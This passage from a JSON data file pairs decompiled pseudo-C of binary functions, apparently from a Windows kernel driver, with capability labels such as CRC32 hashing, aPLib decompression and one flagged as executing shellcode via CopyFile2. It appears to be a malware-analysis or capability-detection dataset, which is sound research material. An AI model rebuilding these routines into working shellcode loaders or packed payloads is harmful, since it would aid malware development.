= piVar18 + 1;\n    } while (iVar2 != 0);\n    uVar3 = (~iVar13 - 1) * 2;\n    uVar1 = (*arg3 - (uVar19 & 0xffff)) + uVar3;\n    uVar14 = uVar1;\n    *arg3 = uVar14;\n    *(arg3 + 2) = uVar14;\n    iVar13 = fcn.0002fbc4(uVar1 & 0xffff);\n    if (iVar13 == 0) {\n        *arg4 = 0xc000009a;\n        return arg4 & 0xffffffffffffff00 | uVar15;\n    }\n    fcn.000619f6(iVar13, piVar16, uVar3);\n    puVar10 = fcn.000619f6(uVar3 + iVar13, uVar19 + arg3[1], *arg3 - uVar3);\n    arg3[1] = iVar13;\ncode_r0x0002de5f:\n    return puVar10 & 0xffffffffffffff00 | uVar15;\n}\n",
        "token_count": 2214
    },
    "00037cc0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.00037cc0(int16_t *arg1, int16_t *arg2, int64_t **arg3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    int64_t *arg1_01;\n    int64_t iVar5;\n    int64_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int16_t *piVar9;\n    uint32_t auStackX8 [2];\n    int16_t *piStackX16;\n    int32_t iStackX32;\n    uint64_t in_stack_ffffffffffffff58;\n    ulong uStack152;\n    int64_t iStack144;\n    uchar auStack136 [16];\n    uint auStack120 [2];\n    ulong uStack112;\n    uchar *puStack104;\n    uint uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    \n    arg1_01 = NULL;\n    uStack152 = 0;\n    if (arg1 == NULL) {\n        return 0xc00000ef;\n    }\n    if (arg3 == NULL) {\n        return 0xc00000f1;\n    }\n    *arg3 = NULL;\n    piStackX16 = arg2;\n    fcn.000619f0(auStack136, arg1);\n    puStack104 = auStack136;\n    auStack120[0] = 0x30;\n    uStack112 = 0;\n    uStack96 = 0x140;\n    uStack88 = 0;\n    uStack80 = 0;\n    uVar4 = fcn.000619ea(&uStack152, 8, auStack120);\n    if (uVar4 != 0) {\n        return uVar4;\n    }\n    uVar4 = 0x418;\n    arg1_00 = fcn.0002fbc4(0x418);\n    piVar6 = arg1_01;\n    if (arg1_00 != 0) {\n        while( true ) {\n            in_stack_ffffffffffffff58 = in_stack_ffffffffffffff58 & 0xffffffff00000000 | uVar4;\n            uVar2 = fcn.00061abc(uStack152, piVar6, 0, arg1_00, in_stack_ffffffffffffff58, auStackX8);\n            if (uVar2 == 0xc0000023) {\n                fcn.0002fc50(arg1_00);\n                uVar2 = auStackX8[0];\n                uVar4 = auStackX8[0];\n                arg1_00 = fcn.0002fbc4(uVar4);\n                if (arg1_00 == 0) goto code_r0x00037d74;\n                in_stack_ffffffffffffff58 = in_stack_ffffffffffffff58 & 0xffffffff00000000 | uVar2;\n                uVar2 = fcn.00061abc(uStack152, piVar6, 0, arg1_00, in_stack_ffffffffffffff58, auStackX8);\n            }\n            uVar7 = uVar2;\n            if (uVar2 == 0x8000001a) {\n                iVar8 = piVar6 + 1 << 3;\n                arg1_01 = fcn.0002fbc4(iVar8);\n                if (arg1_01 == NULL) goto code_r0x00037e25;\n                fcn.00061a56(arg1_01, 0, iVar8);\n                if (arg2 == NULL) {\n                    iVar8 = 0;\n                    goto code_r0x00037e5e;\n                }\n                uVar7 = 0xffffffffffffffff;\n                goto code_r0x00037e50;\n            }\n            if (uVar2 != 0) break;\n            piVar6 = piVar6 + 1;\n        }\n        goto code_r0x00037f94;\n    }\ncode_r0x00037d74:\n    uVar7 = 0xc0000017;\n    goto code_r0x00037fa5;\ncode_r0x00037e25:\n    uVar7 = 0xc0000017;\n    goto code_r0x00037f94;\n    while( true ) {\n        uVar7 = uVar7 - 1;\n        iVar1 = *arg2;\n        arg2 = arg2 + 1;\n        if (iVar1 == 0) break;\ncode_r0x00037e50:\n        if (uVar7 == 0) break;\n    }\n    iVar8 = ~uVar7 - 1;\ncode_r0x00037e5e:\n    uVar7 = 0xffffffffffffffff;\n    piVar9 = arg1;\n    do {\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        iVar1 = *piVar9;\n        piVar9 = piVar9 + 1;\n    } while (iVar1 != 0);\n    iStackX32 = 0;\n    iStack144 = ~uVar7 - 1;\n    uVar2 = fcn.00061abc(uStack152, 0, 0, arg1_00, in_stack_ffffffffffffff58 & 0xffffffff00000000 | uVar4, auStackX8);\n    piVar6 = arg1_01;\n    while (uVar2 != 0x8000001a) {\n        uVar7 = uVar2;\n        if (uVar2 != 0) goto code_r0x00037f94;\n        *(arg1_00 + 0x10 + (*(arg1_00 + 0xc) >> 1) * 2) = 0;\n        iVar5 = fcn.0002fbc4((*(arg1_00 + 0xc) + iStack144 + iVar8) * 2 + 8);\n        *piVar6 = iVar5;\n        if (iVar5 == 0) goto code_r0x00037e25;\n        if (piStackX16 == NULL) {\n            uVar7 = arg1_00 + 0x10;\n            iVar3 = fcn.00061a0e(iVar5, *(arg1_00 + 0xc) + iStack144 + 4 + iVar8, 0x11ac0, arg1, uVar7);\n        }\n        else {\n            uVar7 = arg1_00 + 0x10;\n            iVar3 = fcn.00061a0e(iVar5, *(arg1_00 + 0xc) + iStack144 + 4 + iVar8, 0x14970, arg1, uVar7, piStackX16);\n        }\n        if (iVar3 < 0) {\n            uVar7 = 0xc0000001;\n            goto code_r0x00037f94;\n        }\n        iStackX32 = iStackX32 + 1;\n        piVar6 = piVar6 + 1;\n        uVar2 = fcn.00061abc(uStack152, iStackX32, 0, arg1_00, uVar7 & 0xffffffff00000000 | uVar4, auStackX8);\n    }\n    uVar7 = 0;\ncode_r0x00037f94:\n    if (arg1_00 != 0) {\n        fcn.0002fc50(arg1_00);\n    }\n    if (uVar7 == 0) {\n        *arg3 = arg1_01;\n    }\n    else {\ncode_r0x00037fa5:\n        fcn.00037c84(arg1_01);\n    }\n    fcn.000619de(uStack152);\n    return uVar7;\n}\n",
        "token_count": 1715
    },
    "0004a104": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint32_t fcn.0004a104(int64_t arg1, int64_t arg2)\n\n{\n    uint16_t uVar1;\n    uint64_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    \n    iVar6 = *(arg1 + 0x3c) + arg1;\n    if (*(iVar6 + 0x18) == 0x10b) {\n        uVar2 = *(iVar6 + 0x34);\n        uVar8 = *(iVar6 + 0xa0);\n        uVar4 = *(iVar6 + 0x70);\n    }\n    else {\n        uVar8 = *(iVar6 + 0xb0);\n        uVar2 = *(iVar6 + 0x30);\n        uVar4 = *(iVar6 + 0x80);\n    }\n    arg2 = arg2 - uVar2;\n    if (arg2 != 0) {\n        if (uVar8 == 0) {\n            return -((uVar4 & 1) != 0);\n        }\n        while( true ) {\n            piVar3 = uVar8 + arg1;\n            if (piVar3[1] == 0) break;\n            uVar4 = 0;\n            piVar5 = piVar3 + 2;\n            uVar2 = piVar3[1] - 8 >> 1;\n            if ((uVar2 & 0xffff) != 0) {\n                do {\n                    uVar7 = (*piVar5 & 0xfff) + *piVar3;\n                    uVar1 = *piVar5 >> 0xc;\n                    if (uVar1 != 0) {\n                        if (uVar1 == 1) {\n                            *(uVar7 + arg1) = *(uVar7 + arg1) + (arg2 >> 0x10);\n                        }\n                        else if (uVar1 == 2) {\n                            *(uVar7 + arg1) = *(uVar7 + arg1) + arg2;\n                        }\n                        else if (uVar1 == 3) {\n                            *(uVar7 + arg1) = *(uVar7 + arg1) + arg2;\n                        }\n                        else {\n                            if ((uVar1 == 4) || (uVar1 != 10)) {\n                                return 0x21590064;\n                            }\n                            *(uVar7 + arg1) = *(uVar7 + arg1) + arg2;\n                        }\n                    }\n                    uVar4 = uVar4 + 1;\n                    piVar5 = piVar5 + 2;\n                } while (uVar4 < (uVar2 & 0xffff));\n            }\n            uVar8 = uVar8 + piVar3[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 643
    },
    "0004a77c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0004a77c(ulong arg1, int64_t arg2, ulong arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    ulong auStackX16 [3];\n    int64_t iStack64;\n    \n    if (arg2 == 0) {\n        uVar3 = 0x21590066;\n    }\n    else if (arg4 == NULL) {\n        uVar3 = 0x21590068;\n    }\n    else {\n        iVar1 = fcn.000619d8(arg2, 0x15d68);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0004a418(arg1, 0x15d40, 0, auStackX16);\n            if (iVar1 == 0) {\n                uVar2 = fcn.0004a2e4(auStackX16[0], 0x15d38, 0, 0);\n                uVar3 = uVar2;\n                if (uVar2 == 0) {\n                    while ((uVar2 = uVar3,  uVar2 < *(iStack64 + 4) && (iVar1 = fcn.000619d8(arg2 + 8),  iVar1 != 0))) {\n                        uVar3 = uVar2 + 1;\n                    }\n                    if (uVar2 < *(iStack64 + 4)) {\n                        puVar4 = *(iStack64 + 0x10 + uVar3 * 0xc) + iStack64;\n                        if (*puVar4 == 0) {\n                            *arg4 = 0xffffffff;\n                            uVar3 = 0;\n                        }\n                        else if (*arg4 < *puVar4) {\n                            if (arg3 < puVar4[*arg4 * 4 + 4] + 2) {\n                                uVar3 = 0x2159000b;\n                            }\n                            else {\n                                fcn.000619f6(arg2, puVar4[*arg4 * 4 + 3] + iStack64);\n                                *(arg2 + (puVar4[(*arg4 + 1) * 4] >> 1) * 2) = 0;\n                                if (*arg4 < *puVar4 - 1) {\n                                    *arg4 = *arg4 + 1;\n                                }\n                                else {\n                                    *arg4 = 0xffffffff;\n                                }\n                                uVar3 = 0;\n                            }\n                        }\n                        else {\n                            uVar3 = 0x2159000e;\n                        }\n                    }\n                    else {\n                        *arg4 = 0xffffffff;\n                        uVar3 = 0;\n                    }\n                }\n                fcn.0002fc50(auStackX16[0]);\n            }\n            else {\n                *arg4 = 0xffffffff;\n                uVar3 = 0;\n            }\n        }\n        else {\n            *arg4 = 0xffffffff;\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 688
    },
    "0004c36c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0004c36c(ulong arg1, int16_t *arg2)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint64_t arg2_00;\n    int64_t arg2_01;\n    int16_t *piVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    char in_R8B;\n    char in_R9B;\n    uint16_t *puVar10;\n    bool bVar11;\n    uint64_t *in_stack_00000028;\n    char acStack484 [4];\n    int16_t aiStack480 [4];\n    int64_t iStack472;\n    int64_t iStack464;\n    uint32_t uStack456;\n    uint uStack452;\n    uint64_t uStack448;\n    int64_t iStack440;\n    uint32_t uStack428;\n    uchar auStack424 [20];\n    uint32_t uStack404;\n    int64_t iStack400;\n    uchar auStack376 [24];\n    uint32_t uStack352;\n    ulong uStack344;\n    uint16_t auStack332 [34];\n    uchar auStack264 [48];\n    uint64_t uStack216;\n    uint16_t auStack192 [8];\n    uint16_t auStack176 [64];\n    \n    iVar6 = -1;\n    piVar7 = arg2;\n    do {\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        iVar1 = *piVar7;\n        piVar7 = piVar7 + 1;\n    } while (iVar1 != 0);\n    uStack448 = (~iVar6 - 1) * 2;\n    iStack472 = 0;\n    if (arg2 == NULL) {\n        return 0x21590066;\n    }\n    if (in_stack_00000028 == NULL) {\n        return 0x21590069;\n    }\n    *in_stack_00000028 = 0;\n    iVar6 = fcn.0002fbc4(0x20a);\n    if (iVar6 == 0) {\n        return 0x21590004;\n    }\n    iStack464 = iVar6;\n    uVar4 = fcn.00049f40(&iStack472, 0x438, arg1);\n    if ((uVar4 == 0) && (uVar4 = fcn.00049d80(iStack472, acStack484),  uVar4 == 0)) {\n        bVar11 = acStack484[0] == '\\0';\n        uVar4 = fcn.00049d34(iStack472, acStack484);\n        if (uVar4 == 0) {\n            if (in_R9B == '\\0') {\n                uVar4 = fcn.0004b164(iStack472, &uStack456);\n            }\n            else {\n                uVar4 = fcn.0004b198(iStack472, &uStack456);\n            }\n            if (uVar4 == 0) {\n                if ((bVar11) || ((acStack484[0] != bVar11 && (in_R9B != '\\0')))) {\n                    uVar4 = fcn.00049dcc(iStack472, CONCAT44(uStack452, uStack456), auStack424, 0x20);\n                    if (uVar4 != 0) goto code_r0x0004c86d;\n                    if (iStack400 == 0) {\n                        uVar4 = 0xffffffff;\n                        goto code_r0x0004c86d;\n                    }\n                    uVar4 = fcn.00049dcc(iStack472, iStack400, auStack376, 0x40);\n                    iVar3 = iStack464;\n                    if (uVar4 != 0) goto code_r0x0004c86d;\n                    puVar10 = auStack192;\n                    if (in_R8B == '\\0') {\n                        puVar10 = auStack176;\n                    }\n                    do {\n                        do {\n                            do {\n                                arg2_01 = uStack344;\n                                if (arg2_01 == iStack400 + 0x20) goto code_r0x0004c844;\n                                uVar4 = fcn.00049dcc(iStack472, arg2_01, &iStack440, 0x10);\n                                iVar6 = iVar3;\n                                if ((uVar4 != 0) ||\n                                   (uVar4 = fcn.00049dcc(iStack472, arg2_01 + -0x10, auStack264, 0x88),  uVar4 != 0))\n                                goto code_r0x0004c86d;\n                                uVar2 = *puVar10;\n                                uStack344 = iStack440;\n                            } while (uStack448 != uVar2);\n                            if ((uVar2 & 0xfffe) < 0x208) {\n                                uVar9 = uVar2 >> 1;\n                            }\n                            else {\n                                uVar9 = 0x104;\n                            }\n                            iVar5 = fcn.00049dcc(iStack472, *(puVar10 + 4), iVar3, uVar9 * 2);\n                            uStack344 = iStack440;\n                        } while (iVar5 != 0);\n                        *(iVar3 + uVar9 * 2) = 0;\n                        iVar5 = fcn.000619d8(iVar3, arg2);\n                        uStack344 = iStack440;\n                    } while (iVar5 != 0);\n                    uVar4 = fcn.00049dcc(iStack472, arg2_01 + 0x5c, aiStack480, 2);\n                    if (uVar4 != 0) goto code_r0x0004c86d;\n                    if (aiStack480[0] != -1) {\n                        aiStack480[0] = aiStack480[0] + 1;\n                        uVar4 = fcn.00049dfc(iStack472, arg2_01 + 0x5c, aiStack480, 2);\n                        if (uVar4 != 0) goto code_r0x0004c86d;\n                    }\n                    *in_stack_00000028 = uStack216;\n                }\n                else {\n                    uVar4 = fcn.00049dcc(iStack472, CONCAT44(uStack452, uStack456), &iStack440, 0x10);\n                    if (uVar4 != 0) goto code_r0x0004c86d;\n                    uVar9 = uStack428;\n                    if (uVar9 == 0) {\n                        uVar4 = uStack428 - 1;\n                        goto code_r0x0004c86d;\n                    }\n                    uVar4 = fcn.00049dcc(iStack472, uVar9, auStack424, 0x24);\n                    iVar3 = iStack464;\n                    if (uVar4 != 0) goto code_r0x0004c86d;\n                    puVar10 = &uStack344 + 4;\n                    if (in_R8B == '\\0') {\n                        puVar10 = auStack332;\n                    }\n                    do {\n                        do {\n                            do {\n                                arg2_00 = uStack404;\n                                if (arg2_00 == uVar9 + 0x14) goto code_r0x0004c844;\n                                uVar4 = fcn.00049dcc(iStack472, arg2_00, &uStack456, 8);\n                                iVar6 = iVar3;\n                                if ((uVar4 != 0) ||\n                                   (uVar4 = fcn.00049dcc(iStack472, arg2_00 - 8, auStack376, 0x48),  uVar4 != 0))\n                                goto code_r0x0004c86d;\n                                uVar2 = *puVar10;\n                                uStack404 = uStack456;\n                            } while (uStack448 != uVar2);\n                            if ((uVar2 & 0xfffe) < 0x208) {\n                                uVar8 = uVar2 >> 1;\n                            }\n                            else {\n                                uVar8 = 0x104;\n                            }\n                            iVar5 = fcn.00049dcc(iStack472, *(puVar10 + 2), iVar3, uVar8 * 2);\n                            uStack404 = uStack456;\n                        } while (iVar5 != 0);\n                        *(iVar3 + uVar8 * 2) = 0;\n                        iVar5 = fcn.000619d8(iVar3, arg2);\n                        uStack404 = uStack456;\n                    } while (iVar5 != 0);\n                    uVar4 = fcn.00049dcc(iStack472, arg2_00 + 0x30, aiStack480, 2);\n                    if (uVar4 != 0) goto code_r0x0004c86d;\n                    if (aiStack480[0] != -1) {\n                        aiStack480[0] = aiStack480[0] + 1;\n                        uVar4 = fcn.00049dfc(iStack472, arg2_00 + 0x30, aiStack480, 2);\n                        if (uVar4 != 0) goto code_r0x0004c86d;\n                    }\n                    *in_stack_00000028 = uStack352;\n                }\ncode_r0x0004c844:\n                uVar4 = ~-(*in_stack_00000028 != 0) & 0x21590005;\n                iVar6 = iStack464;\n            }\n        }\n    }\ncode_r0x0004c86d:\n    if (iStack472 != 0) {\n        fcn.000619de();\n    }\n    fcn.0002fc50(iVar6);\n    return uVar4;\n}\n",
        "token_count": 2188
    },
    "00055c68": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.00055c68(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    uint8_t uVar11;\n    int32_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    int32_t *in_stack_00000038;\n    uint32_t uStack136;\n    uint8_t uStack132;\n    uint32_t uStack128;\n    uint8_t uStack124;\n    uint32_t auStack88 [14];\n    \n    if ((arg4 < 0x1d) && (iVar2 = fcn.00055a5c(arg1, arg2, &uStack136, 0),  iVar2 != 0)) {\n        uStack128 = uStack136 & 0xff00ffff;\n        uStack124 = ((uStack132 ^ arg4) & 0x1f ^ uStack132) & 0xbf;\n        uStack124 = uStack124 ^ ((in_stack_00000028 != 0) << 5 ^ uStack124) & 0x20;\n        fcn.000619f6();\n        arg4._0_4_ = arg4 + 5;\n        uVar11 = 0;\n        if (arg4 != 0) {\n            puVar5 = &uStack128;\n            uVar7 = arg4;\n            uVar11 = 0;\n            do {\n                uVar11 = uVar11 + *puVar5;\n                puVar5 = puVar5 + 1;\n                uVar7 = uVar7 - 1;\n            } while (uVar7 != 0);\n            if (arg4 != 0) {\n                puVar5 = &uStack128;\n                uVar7 = arg4;\n                do {\n                    *puVar5 = *puVar5 ^ uVar11 >> 1;\n                    puVar5 = puVar5 + 1;\n                    uVar7 = uVar7 - 1;\n                } while (uVar7 != 0);\n            }\n        }\n        uStack128._0_3_ = CONCAT12(uVar11, uStack128);\n        uStack128 = uStack128 & 0xff000000 | uStack128;\n        uVar3 = fcn.00055960(&uStack128, arg4, auStack88);\n        uVar7 = uVar3;\n        if (*(arg1 + 0xc) != '\\0') {\n            for (puVar8 = *(arg1 + 0xc) + 0xd + arg1; *puVar8 != 0; puVar8 = puVar8 + (*puVar8 + 1)) {\n            }\n            uVar6 = (puVar8 - arg1) + 5;\n            if (uVar6 < 0x81) {\n                fcn.000619f6(in_stack_00000030, arg1, uVar6);\n                *(in_stack_00000030 + 2) = *(in_stack_00000030 + 2) | 0x84;\n                *(in_stack_00000030 + 3) = *(in_stack_00000030 + 3) & 0xf0 | 0x80;\n                uVar1 = fcn.0002fd20(uVar7 & 0xffff);\n                puVar9 = uVar6 + in_stack_00000030;\n                *(in_stack_00000030 + 8) = 0;\n                *(in_stack_00000030 + 10) = 0;\n                *(in_stack_00000030 + 6) = uVar1;\n                if (uVar3 != 0) {\n                    puVar5 = auStack88;\n                    puVar10 = puVar9;\n                    do {\n                        *puVar10 = 0xc0;\n                        puVar10[1] = 0xc;\n                        uVar1 = fcn.0002fd20(1);\n                        *(puVar10 + 2) = uVar1;\n                        uVar1 = fcn.0002fd20(1);\n                        *(puVar10 + 4) = uVar1;\n                        uVar4 = fcn.0002fcf4(0x3c);\n                        *(puVar10 + 6) = uVar4;\n                        uVar1 = fcn.0002fd20();\n                        *(puVar10 + 10) = uVar1;\n                        *(puVar10 + 0xc) = *puVar5;\n                        uVar4 = fcn.0002fcf4(*puVar5);\n                        puVar9 = puVar10 + 0x10;\n                        puVar5 = puVar5 + 1;\n                        uVar7 = uVar7 - 1;\n                        *(puVar10 + 0xc) = uVar4;\n                        puVar10 = puVar9;\n                    } while (uVar7 != 0);\n                }\n                *in_stack_00000038 = puVar9 - in_stack_00000030;\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1188
    },
    "00058a5c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00058a5c(int32_t *arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    ulong *puVar6;\n    uint8_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t **ppiVar10;\n    int64_t **arg1_00;\n    int64_t **ppiVar11;\n    int32_t aiStackX8 [4];\n    uint64_t auStackX24 [2];\n    int64_t in_stack_00000028;\n    ulong in_stack_00000030;\n    int32_t aiStack88 [2];\n    ulong uStack80;\n    ulong uStack72;\n    int64_t iStack64;\n    \n    uStack72 = 0;\n    if ((arg3 == 0) && (in_stack_00000028 != 0)) {\n        arg2 = 0;\n    }\n    auStackX24[0] = arg3;\n    if ((*(arg1 + 6) & 1) == 0) {\n        aiStackX8[0] = *arg1;\n    }\n    else {\n        uVar3 = fcn.000585a4(aiStackX8, arg4, *(arg1 + 6), arg2);\n        uVar9 = uVar3;\n        if (uVar3 != 0) goto code_r0x00058de6;\n    }\n    iVar2 = aiStackX8[0];\n    fcn.00031088(0x879e8);\n    arg1_00 = *0x87a00;\n    ppiVar11 = NULL;\n    if (*0x87a00 == NULL) {\ncode_r0x00058db8:\n        fcn.00031108(0x879e8);\n        uVar9 = 6;\n    }\n    else {\n        do {\n            ppiVar10 = arg1_00;\n            arg1_00 = ppiVar10;\n            if (*(ppiVar10 + 1) == iVar2) break;\n            arg1_00 = *ppiVar10;\n            ppiVar11 = ppiVar10;\n        } while (arg1_00 != NULL);\n        if (arg1_00 == NULL) goto code_r0x00058db8;\n        if ((*(arg1 + 6) & 8) != 0) {\n            ppiVar10 = *arg1_00;\n            if (ppiVar11 != NULL) {\n                *ppiVar11 = *arg1_00;\n                ppiVar10 = *0x87a00;\n            }\n            *0x87a00 = ppiVar10;\n            fcn.00031108(0x879e8);\n            fcn.0002f23c(arg1_00 + 3);\n            fcn.0005fd0c(arg1_00 + 2, 0);\n            fcn.0002f2a4(arg1_00 + 3);\n            fcn.0002f214(arg1_00 + 3);\n            fcn.0002fc50(arg1_00);\n            uVar9 = 0x4ca;\n            goto code_r0x00058de6;\n        }\n        fcn.0002f23c(arg1_00 + 3);\n        fcn.00031108(0x879e8);\n        iVar8 = *0xfffff78000000320;\n        uVar3 = (**0x112f0)();\n        *(arg1_00 + 5) = (uVar3 * iVar8) / 10000;\n        if ((*(arg1 + 6) & 2) == 0) {\n            if (arg2 == 0) {\n                uVar3 = fcn.0003f530(in_stack_00000030, in_stack_00000028, &iStack64, auStackX24);\n                uVar9 = uVar3;\n                arg2 = iStack64;\n                if (uVar3 == 0) goto code_r0x00058bf9;\n            }\n            else {\n                iStack64 = 0;\ncode_r0x00058bf9:\n                uVar3 = fcn.00060208(arg1_00[2], arg2, auStackX24[0] & 0xffffffff, 0);\n                uVar9 = uVar3;\n                fcn.0002fc50(iStack64);\n                if (uVar3 == 0) goto code_r0x00058c2f;\n            }\n        }\n        else {\ncode_r0x00058c2f:\n            iVar8 = *0xfffff78000000320;\n            uStack80 = 0;\n            if ((*(arg1 + 6) & 4) == 0) {\n                uStack72 = 0;\n                aiStack88[0] = 0;\n                uStack80._6_2_ = 2;\n            }\n            else {\n                uVar3 = (**0x112f0)();\n                uVar4 = fcn.00060288(arg1_00[2], &uStack72, aiStack88, *(arg1_00 + 4));\n                iVar1 = *0xfffff78000000320;\n                uVar9 = uVar4;\n                uVar5 = (**0x112f0)();\n                if (uVar4 == 0x21590002) {\n                    uStack72 = 0;\n                    aiStack88[0] = 0;\n                    uStack80._0_7_ = CONCAT16(2, uStack80);\n                    uStack80 = uStack80 & 0xff00000000000000 | uStack80;\n                    uVar9 = fcn.00061a9e();\n                    *(arg1_00 + 4) = *(arg1_00 + 4) + (uVar9 & 0xffffffff) % *(arg1_00 + 0x24);\n                }\n                else {\n                    if (uVar4 != 0) goto code_r0x00058dc5;\n                    *(arg1_00 + 4) = ((iVar1 * uVar5) / 10000 - (iVar8 * uVar3) / 10000) + *(arg1_00 + 4) >> 1;\n                }\n                if (*0x7820c <= *(arg1_00 + 4) && *(arg1_00 + 4) != *0x7820c) {\n                    *(arg1_00 + 4) = *0x78208;\n                }\n            }\n            if ((*(arg1 + 6) & 1) != 0) {\n                uStack80._6_2_ = uStack80._6_2_ | 1;\n            }\n            uVar7 = 0;\n            iVar8 = 7;\n            uStack80._0_6_ = CONCAT24(*(arg1 + 1), aiStackX8[0]);\n            puVar6 = &uStack80;\n            do {\n                uVar7 = uVar7 + *puVar6;\n                puVar6 = puVar6 + 1;\n                iVar8 = iVar8 + -1;\n            } while (iVar8 != 0);\n            uStack80 = uStack80 & 0xffffffffffffff | uVar7 << 0x38;\n            uVar3 = fcn.0003e8b0(in_stack_00000030, &uStack80, uStack72, aiStack88[0]);\n            iVar8 = *0xfffff78000000320;\n            uVar9 = uVar3;\n            uVar3 = (**0x112f0)();\n            *(arg1_00 + 5) = (uVar3 * iVar8) / 10000;\n        }\n    }\ncode_r0x00058dc5:\n    if (arg1_00 != NULL) {\n        fcn.0005fde8(arg1_00[2], uStack72);\n        fcn.0002f2a4(arg1_00 + 3);\n    }\n    if (uVar9 == 0) {\n        return uVar9;\n    }\ncode_r0x00058de6:\n    fcn.0003e9f0(in_stack_00000030, uVar9);\n    return uVar9;\n}\n",
        "token_count": 1860
    },
    "0005cd3c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.0005cd3c(int64_t arg1, uchar *arg2, ulong arg3, uint8_t *arg4)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar *puStack360;\n    uint8_t *puStack352;\n    uint uStack344;\n    uchar auStack336 [8];\n    uchar *puStack328;\n    int32_t iStack320;\n    uchar auStack312 [264];\n    \n    if (arg1 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else {\n        fcn.00061a56(&puStack360);\n        uStack344 = 3;\n        puStack360 = arg2;\n        puStack352 = arg4;\n        if (((arg3 & 8) == 0) && (arg2 == NULL)) {\n            puStack360 = auStack336;\n            iVar2 = fcn.00061a9e();\n            iStack320 = iVar2 % *(arg1 + 100) + 1;\n            iVar4 = 0;\n            if (0 < iStack320) {\n                do {\n                    uVar1 = fcn.00061a9e();\n                    iVar5 = iVar4 + 1;\n                    auStack312[iVar4] = uVar1;\n                    iVar4 = iVar5;\n                } while (iVar5 < iStack320);\n            }\n            puStack328 = auStack312;\n        }\n        *arg4 = *arg4 ^ arg4[2] >> 1;\n        arg4[1] = arg4[1] ^ arg4[2] >> 1;\n        uVar3 = fcn.0006052c(*(arg1 + 8), &puStack360, arg3);\n        *arg4 = *arg4 ^ arg4[2] >> 1;\n        arg4[1] = arg4[1] ^ arg4[2] >> 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 449
    },
    "00018584": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.00018584(int16_t **arg1, int32_t **arg2, ulong noname_2, uint64_t arg4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    int32_t *piVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    int64_t *in_stack_00000028;\n    int16_t aiStack72 [14];\n    ushort uStack44;\n    \n    if (arg1 == NULL) {\n        uVar3 = 0xc0000001;\n    }\n    else {\n        if ((arg4 == 0) || (arg1[6] + *in_stack_00000028 <= arg4)) {\n            uVar5 = 0xffffffffffffffff;\n            piVar7 = *arg1;\n            do {\n                if (uVar5 == 0) break;\n                uVar5 = uVar5 - 1;\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n            piVar4 = fcn.0002fbc4(~uVar5 * 2 + 0xc6);\n            if (piVar4 != NULL) {\n                fcn.00061a56(piVar4, 0, 0xa8);\n                piVar7 = piVar4 + 0xc6;\n                *(piVar4 + 2) = piVar7;\n                iVar6 = -1;\n                piVar8 = *arg1;\n                do {\n                   